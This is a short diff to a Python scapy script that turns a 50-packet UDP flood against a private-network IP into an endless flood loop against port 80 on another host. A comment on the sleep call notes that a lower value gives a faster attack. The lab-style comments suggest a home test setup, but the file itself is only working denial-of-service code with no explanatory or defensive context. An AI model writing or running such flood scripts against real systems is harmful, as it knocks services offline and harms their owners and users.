@@ -1,12 +1,11 @@
 from scapy.all import *
+import time
 
-target_ip = "192.168.1.2"  # Replace with target IP
-port = 53  # Targeting DNS port
+target_ip = "192.168.254.107"  # Replace with your Windows machine's IP
+target_port = 80  # Change to any open UDP port
 
-print(f"Starting UDP flood on {target_ip}...")
+print(f"Starting UDP flood attack on {target_ip}:{target_port}...")
 
-for _ in range(50):  # Send 50 UDP packets
-    packet = IP(dst=target_ip)/UDP(dport=port)/Raw(load="A"*50)
-    send(packet, verbose=False)
-
-print("UDP flood attack completed.")
+while True:
+    send(IP(dst=target_ip)/UDP(dport=target_port)/Raw(load="Flood"), verbose=False)
+    time.sleep(0.01)  # Adjust rate (lower = faster attack)
